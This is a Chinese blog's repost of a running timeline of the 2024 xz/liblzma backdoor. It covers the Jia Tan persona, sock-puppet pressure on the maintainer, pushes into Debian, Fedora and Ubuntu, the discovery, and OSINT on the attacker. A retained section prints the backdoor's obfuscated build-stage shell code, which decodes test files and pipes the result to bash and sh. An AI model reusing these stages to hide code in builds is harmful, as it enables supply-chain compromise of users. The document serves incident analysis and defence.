<!DOCTYPE html ><html lang="zh"><head> <link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.8.0/styles/default.min.css"/><script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script><script>window.addEventListener('DOMContentLoaded',()=>{
    hljs.highlightAll();
})</script><style>blockquote{
    margin: 4px;
    border-left: 2px solid var(--Cbrand);
    opacity: .75
}
</style><link rel="icon" href="/files/icon.svg"/><meta charset="utf-8"/><meta name="viewport" content="width:device-width,initial-scale=1.0"/><meta name="author" content="0xarch"/><meta name="description" content="_Please note: This is being updated in real time. The intent is to make sense of lots of simultaneous discoveries regarding this backdoor. last updated: 10:30 PM EST_

_Update: The GitHub page for xz has been suspended._
"/><meta name="keywords" content="Linux Open-Source-Software"/><meta http-equiv="content-language" content="zh-CN"/><link rel="stylesheet" href="/files/style.css"/><link rel="stylesheet" href="/files/components/KContentTable.css"/><script src="/files/es/KContentTable.js"></script><link rel="stylesheet" href="/files/components/KFooter.css"/><link rel="stylesheet" href="/files/components/KNextPage.css"/><link rel="stylesheet" href="/files/components/KNavigationBar.css"/><script src="/files/es/KNavigationBar.js"></script><title>[转载] Everything I Know About the Xz Backdoor :: 文章</title></head><body class="colorful" OCP="OVERRIDE" style="--color1:#7ce588;--color2:#1e3937"><header class="KNavigationBar"><a class="kLogo" href="/">0xarch's Blogs</a><button class="kToggle"><svg viewBox="0 0 48 48" fill="none" height="48" stroke="currentColor" stroke-width="2" width="48" xmlns="http://www.w3.org/2000/svg"><path d="M12,14h24M12,24h24M12,34h24"></path></svg></button><div class="kCon"><a href="/">首页</a><a href="/archive/1">归档</a><a href="/category/1">分类</a><a href="/tag/1">标签</a><a href="/about/">关于</a><a href="/status/">状态 </a></div></header><div class="PageLabel uWcon"><div class="h1">[转载] Everything I Know About the Xz Backdoor</div><b class="meta"><date>2024年3月29日星期五</date><span>Linux</span><span>1836字</span></b></div><main class="uWcon"><section><h2>前言</h2><p><em>Please note: This is being updated in real time. The intent is to make sense of lots of simultaneous discoveries regarding this backdoor. last updated: 10:30 PM EST</em></p><p><em>Update: The GitHub page for xz has been suspended.</em></p></section><article id="markdown_fillContent"><h1>[转载] Everything I Know About the Xz Backdoor</h1><p><a href="https://boehs.org/node/everything-i-know-about-the-xz-backdoor%22">原文章</a></p><h3>2021</h3><p>JiaT75 (Jia Tan) creates their GitHub account.</p><p>The first commits they make are not to xz, but they are deeply suspicious. Specifically, they open a PR in libarchive: <a href="https://github.com/libarchive/libarchive/pull/1609">Added error text to warning when untaring with bsdtar</a>. This commit does a little more than it says. It replaces <code>safe_fprint</code> with an unsafe variant, potentially introducing another vulnerability. The code was merged without any discussion, and <del><a href="https://github.com/libarchive/libarchive/blob/master/tar/read.c#L374-L375">lives on to this day</a></del> (<a href="https://github.com/libarchive/libarchive/pull/2101">patched</a>). libarchive should also be considered compromised until proven otherwise.</p><h3>2022</h3><p>In April 2022, Jia Tan submits a patch via a mailing list. The patch is irrelevant, but the events that follow are. A new persona – Jigar Kumar enters, and begins <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00565.html">pressuring</a> for this patch to be merged.</p><p>Soon after, Jigar Kumar <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.html">begins</a> pressuring <em>Lasse Collin</em> to add another maintainer to XZ. In the fallout, we learn a little bit about mental health in open source.</p><p>Three days after the emails pressuring <em>Lasse Collin</em> to add another maintainer, JiaT75 makes their first commit to xz: <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=aa75c5563a760aea3aa23d997d519e702e82726b">Tests: Created tests for hardware functions.</a>. Since this commit, they become a regular contributor to xz (they are currently the second most active). It’s unclear exactly when they became trusted in this repository.</p><p><em>Jigar Kumar</em> is <a href="https://www.mail-archive.com/search?l=xz-devel@tukaani.org&q=Kumar&x=0&y=0">never seen again</a>. Another account — <a href="https://www.mail-archive.com/search?l=xz-devel@tukaani.org&q=from:%22Dennis+Ens%22">Dennis Ens</a> also participates in pressure, with a similar name+number formatted email. This account is also never seen outside of xz discussion, and both do not have any associated accounts that have been discovered.</p><blockquote><p><strong><a href="https://mastodon.social/@glyph/112180922900094371">Glyph</a></strong><br>@<a href="mailto:glyph@mastodon.social">glyph@mastodon.social</a></p><p>I really hope that this causes an industry-wide reckoning with the common practice of letting your entire goddamn product rest on the shoulders of one overworked person having a slow mental health crisis without financially or operationally supporting them whatsoever. I want everyone who has an open source dependency to read this message <a href="https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html">https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html</a></p><p>Mar 29, 2024, 20:43<br><em>转载注明：这段来自于 <a href="https://mastodon.social/@glyph/112180922900094371">Mastodon</a></em></p></blockquote><h3>2023</h3><p>JiaT75 merges their first commit <a href="https://github.com/tukaani-project/xz/pull/7">on Jan 7 2023</a><sup id="fnref1"><a href="#fn1">1</a></sup>, which gives us good indication into when they fully gain trust.</p><p>In March, the primary contact email in Google’s oss-fuzz is <a href="https://github.com/JiaT75/oss-fuzz/commit/6403e93344476972e908ce17e8244f5c2b957dfd">updated</a> to be Jia’s, instead of <em>Lasse Collin</em>.</p><p>Testing infrastructure that will be used in this exploit is committed. Despite <em>Lasse Collin</em> being attributed as the author for this, Jia Tan committed it, and it was originally written by <em>Hans Jansen</em> in June:</p><ul><li>Commit: <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=ee44863ae88e377a5df10db007ba9bfadde3d314">liblzma: Add ifunc implementation to crc64_fast.c</a></li><li>PR: <a href="https://github.com/tukaani-project/xz/pull/53">Replaced crc64_fast constructor with ifunc by hansjans162</a></li></ul><p><em>Hans Jansen</em>’s account was seemingly made specifically to create this pull request. There is very little activity before and after. They will later push for the compromised version of XZ to be included in Debian.</p><p>In July, <a href="https://github.com/google/oss-fuzz/pull/10667">a PR</a> was opened in oss-fuzz to disable ifunc for fuzzing builds, due to issues introduced by the changes above. This appears to be deliberate to mask the malicious changes that will be introduced soon. Also, JiaT75 opened an <a href="https://github.com/llvm/llvm-project/issues/63957">issue</a> about a warning in clang that, while indeed incorrect, drew attention to ifuncs.</p><h3>2024</h3><p>A pull request for Google’s <a href="https://github.com/google/oss-fuzz/pull/11587">oss-fuzz is opened</a> that changes the URL for the project from <a href="http://tukaani.org/xz/">tukaani.org/xz/</a> to <a href="http://xz.tukaani.org/xz-utils/">xz.tukaani.org/xz-utils/</a>. <a href="http://tukaani.org/">tukaani.org</a> is hosted at <code>5.44.245.25</code> in Finland, at <a href="https://www.zoner.fi/">this</a> hosting company. The xz subdomain, meanwhile, points to GitHub pages. This furthers the amount of control Jia has over the project.</p><p>A commit containing the final steps required to execute this backdoor is added to the repository:</p><ul><li>Tests: <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0">Add a few test files</a></li><li>Tests: <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=6e636819e8f070330d835fce46289a3ff72a7b89">Update two test files</a></li></ul><h4>The discovery</h4><p>An email is sent to the oss-security mailing list: <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">backdoor in upstream xz/liblzma leading to ssh server compromise</a>, announcing this discovery, and doing it’s best to explain the exploit chain.</p><blockquote><p><strong><a href="https://mastodon.social/@AndresFreundTec/112180406142695845">AndresFreundTec</a></strong><br>@<a href="mailto:AndresFreundTec@mastodon.social">AndresFreundTec@mastodon.social</a></p><p>I was doing some micro-benchmarking at the time, needed to quiesce the system to reduce noise. Saw sshd processes were using a surprising amount of CPU, despite immediately failing because of wrong usernames etc. Profiled sshd, showing lots of cpu time in liblzma, with perf unable to attribute it to a symbol. Got suspicious. Recalled that I had seen an odd valgrind complaint in automated testing of postgres, a few weeks earlier, after package updates.</p><p>Really required a lot of coincidences.</p><p>Mar 29, 2024, 18:32<br><em>转载注明：这段来自于 <a href="https://mastodon.social/@AndresFreundTec/112180406142695845">Mastodon</a></em></p></blockquote><p>A <a href="https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27">gist</a> has been published with a very good high level technical overview and a “what you need to know”</p><p>In addition to the gist and the email above, a number of analysis attempts have begun emerging:</p><ul><li><a href="https://gynvael.coldwind.pl/?lang=en&id=782#stage2-ext">xz/liblzma: Bash-stage Obfuscation Explained</a></li><li><a href="https://bsky.app/profile/filippo.abyssdomain.expert/post/3kowjkx2njy2b">“It’s RCE, not auth bypass”</a></li><li><a href="https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504">[WIP] XZ Backdoor Analysis and symbol mapping</a></li><li><a href="https://infosec.exchange/@fr0gger/112189232773640259">Infographic</a></li></ul><details><summary>This isn't good yet, I'm still figuring it out</summary><p>Code is <a href="https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63">added</a> to the upstream tarballs that injects an obfuscated script from the files committed above to be “executed at the end of configure”. This code, in turn, “modifies <code>$builddir/src/liblzma/Makefile</code> to contain”</p><pre><code class="language-sh">am__test = bad-3-corrupt_lzma2.xz
...
am__test_dir=$(top_srcdir)/tests/files/$(am__test)
...
sed rpath $(am__test_dir) | $(am__dist_setup) &gt;/dev/null 2&gt;&amp;1
</code></pre><p>(you’ll notice this was the file added above) “which ends up as” (what ends up as?)</p><pre><code class="language-sh">sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr &quot;	 \-_&quot; &quot; 	_\-&quot; | xz -d | /bin/bash &gt;/dev/null 2&gt;&amp;1;
</code></pre><p>The sed reportedly transforms into</p><pre><code class="language-sh">####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir=&quot;../../$srcdir&quot;
fi
export i=&quot;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)&quot;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr &quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh
####World####
</code></pre><p>You’ll notice this script is piping one of these files attached in the above commits into a series of very very obfuscated head calls. And after deobfuscation of this script, it leads to a sh file attached in the email:</p><p><a href="https://www.openwall.com/lists/oss-security/2024/03/29/4/1">injected.txt</a></p><p>There are a number of conditions identified that are required for the process to continue:</p><ul><li>Building with gcc and the gnu linker</li><li>only x86-64 linux</li><li>Running as part of a debian or RPM package build</li></ul><p>The final binary reportedly is used in some way to bypass sshd authentication checks.</p></details><blockquote><p>原作者删除了这段 details。此处保留仅作备份。</p></blockquote><h4>A sudden push for inclusion</h4><p>A request for the vulnerable version to be included in Debian is opened by Hans:</p><ul><li><a href="https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1067708">#1067708 - xz-utils: New upstream version available</a></li></ul><p>This request was opened the <a href="https://salsa.debian.org/hjansen">same week</a> Hans’ Debian GitLab account was created. The account created a few similar “update” requests in various low traffic repositories to build credibility, after asking for this one.</p><p>A number of other, suspicious, anonymous name+number accounts with little former activity also push for its inclusion, including <em>misoeater91</em> and <em>krygorin4545</em>. <em>krygorin4545</em>’s PGP key was made 2 days prior to today.</p><blockquote><p>Also seeing this bug. Extra valgrind output causes some failed tests for me. Looks like the new version will resolve it. Would like this new version so I can continue work.</p></blockquote><blockquote><p>I noticed this last week and almost made a valgrind bug. Glad to see it being fixed. Thanks Hans!</p></blockquote><p>The Valgrind bugs mentioned were <em>introduced</em> by this malicious injection, as noted in the email to OSS-Security:</p><blockquote><p>Subsequently the injected code (more about that below) caused valgrind errors and crashes in some configurations, due the stack layout differing from what the backdoor was expecting. These issues were attempted to be worked around in 5.6.1:</p></blockquote><p>A <a href="https://github.com/jamespfennell/xz/pull/2">pull request</a> to a go library by a 1password employee is opened asking to upgrade the library to the vulnerable version, however, it was all unfortunate timing. 1Password reached out by email referring me to this <a href="https://github.com/jamespfennell/xz/pull/2#issuecomment-2027836356">comment</a>, and everything seems to check out.</p><p>A fedora contributor <a href="https://news.ycombinator.com/item?id=39866275">states</a> that <em>Jia</em> was pushing for its inclusion in Fedora as it contains “great new features”</p><p><em>Jia Tan</em> also <a href="https://bugs.launchpad.net/ubuntu/+source/xz-utils/+bug/2059417">attempted</a> to get it into Ubuntu days before the beta freeze.</p><p>A few hours after all this came out, GitHub suspended JiaT75’s account. Thanks? They also banned the repository, meaning people can no longer audit the changes made to it without resorting to mirrors. Immensely helpful, GitHub. They also <a href="https://github.com/JiaT75?tab=following">suspended</a> <em>Lasse Collin</em>’s account, which is completely disgraceful.</p><p>Lasse has begun reverting changes introduced by Jia, <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=f9cf4c05edd14dedfe63833f8ccbe41b55823b00">including</a> one that <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7">added</a> a sneaky period to disable the sandbox. They also have published a FAQ that begins to explain the situation: <a href="https://tukaani.org/xz-backdoor/">XZ Utils backdoor</a></p><h3>OSINT</h3><p>Various people have reached out to me regarding discoveries about the identity of Jia. Some of this has been incorporated in the timeline, but other stuff is “timeless” and so I’m putting it here:</p><h4>IRC</h4><p>I received an email that clarified a few points, and provided new insight into the situation.</p><p>“Jia Tan” was present on the #tukaani IRC channel on Libera.chat. A /whois revealed their connecting IP and activity on March 29th.</p><pre><code>[libera] -!- jiatan [~jiatan@185.128.24.163]
[libera] -!-  was      : Jia Tan
[libera] -!-  hostname : 185.128.24.163
[libera] -!-  account  : jiatan
[libera] -!-  server   : tungsten.libera.chat [Fri Mar 29 14:47:40 2024]
[libera] -!- End of WHOWAS
</code></pre><p>Running an nmap on the IP shows a lot of open ports, which probably indicates a proxy, hosting provider, or something of the sort. The IP is from Singapore.</p><p>Further research shows that this IP belongs to Witopia VPN, so it’s not entirely indicative of a region. Given the timezone, however, I feel like proximity becomes plausible.</p><h4>Important notes on LinkedIn</h4><p>I have received a few emails alerting me to a LinkedIn of somebody named <em>Jia Tan</em><sup id="fnref2"><a href="#fn2">2</a></sup>. Their bio boasts of <em>large-scale vulnerability management</em>. They claim to live in California. Is this our man? The commits on JiaT75’s GitHub are set to +0800, which would not indicate presence in California. UTC-0800 would be California. Most of the commits <a href="https://play.clickhouse.com/play?user=play#U0VMRUNUIHRvSG91cihjcmVhdGVkX2F0KSBBUyBob3VyLCBjb3VudCgqKSBGUk9NIGdpdGh1Yl9ldmVudHMgV0hFUkUgYWN0b3JfbG9naW49J0ppYVQ3NScgR1JPVVAgQlkgaG91ciBPUkRFUiBCWSBob3Vy">were made</a> between UTC 12-17, which is awfully early for California. In my opinion, there is no sufficient evidence that the LinkedIn being discussed is our man. I think identity theft is more likely, but I am of course open to more evidence.</p><h4>Discoveries in the Git logs</h4><p>I received an email from <a href="https://github.com/minhuw">Minhu Wang</a> who investigated the Git log, and found one instance where Jia’s username was different:</p><pre><code class="language-sh">$ git shortlog --summary --numbered --email | grep grep jiat0218@gmail.com
273 Jia Tan &lt;jiat0218@gmail.com&gt;
2 jiat75 &lt;jiat0218@gmail.com&gt;
1 Jia Cheong Tan &lt;jiat0218@gmail.com&gt;
</code></pre><p>They found this particularly interesting as <code>Cheong</code> is new information. I’ve now learned from another source that <em>Cheong</em> isn’t Mandarin, it’s Cantonese. This source theorizes that Cheong is a variant of the 張 surname, as “eong” matches Jyutping (a Cantonese romanisation standard) and “Cheung” is pretty common in Hong Kong as an official surname romanisation. A third source has alerted me that “Jia” is Mandarin (as Cantonese rarely uses <code>J</code> and especially not <code>Ji</code>). The <code>Tan</code> last name is possible in Mandarin, but is most common for the Hokkien Chinese dialect pronunciation of the character 陳 (Cantonese: Chan, Mandarin: Chen). It’s most likely our actor simply mashed plausible sounding Chinese names together.</p><p>Furthermore, an <a href="https://rheaeve.substack.com/p/xz-backdoor-times-damned-times-and">independent analysis</a> of commit timings concludes that the perpetrator worked “Office Hours” in a UTC+02/03 timezone. It’s particularly notable that they worked through the Lunar New Year, and did not work on some notable Eastern European holidays, including Christmas and New Year.</p><h2>Footnotes</h2><ol><li id="fn1">Thanks @joeyh@hachyderm.io <a href="#fnref1">↩︎</a></li><li id="fn2">I was also alerted to discussions of this on Gab, which should tell you what you need to know. <a href="#fnref2">↩︎</a></li></ol></article><hr/><div class="fit"><div>传播许可协议</div><div class="container">这篇文章来自于其他来源。这篇文章可能并没有说明版权信息，如果需要共享此文章及此文章包含的信息，请查看原始文章，并指明原始作者。</div></div><br/><div class="KNextPage"><a class="arrow left nowrap" href="/read/4c7jbWlob3lvLnNyL+m7hOazieeugOivhC5tZA==/">← 崩铁：黄泉简评</a><a class="arrow right nowrap" href="/read/17dzbbGludXgvYXJjaC1wYWNrYWdlLWNvbGxlY3QubWQ=/">Arch Linux 包收集 →</a><a class="top" href="#">Top</a></div></main><hr/><footer class="KFooter uWcon"><div class="kLinks"><nav><h3>Project Fivewu</h3><span>Fewu Generator </span><span>1.2.3</span><a href="https://github.com/0xarch/fewu">Source Code</a></nav><nav><h3>Simplus</h3><span>2.0.0</span><a href="https://github.com/0xarch/fewu-theme-simplus">Github</a></nav><nav><h3>Contact</h3><a href="https://0xarch.github.io">Github Page</a><a href="https://matrix.to/#/#solo_esta_vez:mozilla.org">[Matrix] Moz</a><a href="https://matrix.to/#/#solo_esta_vez:fedora.im">[Matrix] Fedora</a><a href="mailto:alanqa-ops@outlook.com">E-Mail</a></nav><nav><h3>Friends</h3><a href="https://wangyuzhen666.github.io">Wyz666</a></nav></div><br/><hr/><div class="kCopyr tac">2024 Powered by Fewu. 2020-2024 0xarch,soloev All rights reserved.</div></footer><div class="KContentTable"><div class="kTOC"></div><br/><button class="kButton">TOC</button></div></body></html>